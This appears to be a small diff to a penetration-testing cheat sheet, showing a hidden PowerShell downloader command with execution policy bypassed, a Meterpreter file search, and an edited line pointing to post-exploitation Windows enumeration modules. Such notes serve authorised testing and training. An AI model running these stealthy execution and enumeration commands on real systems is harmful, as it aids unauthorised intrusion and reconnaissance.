@@ -162,4 +162,5 @@ C:\> powershell.exe -ExecutionPolicy Bypass -Window Hidden .\downloader.ps1
 
 search -d /pathtobeginsearch -f *.extension
 
-run post/windows/gather/enum_applications
+//helpful post-exploit enum scripts here
+run post/windows/gather/
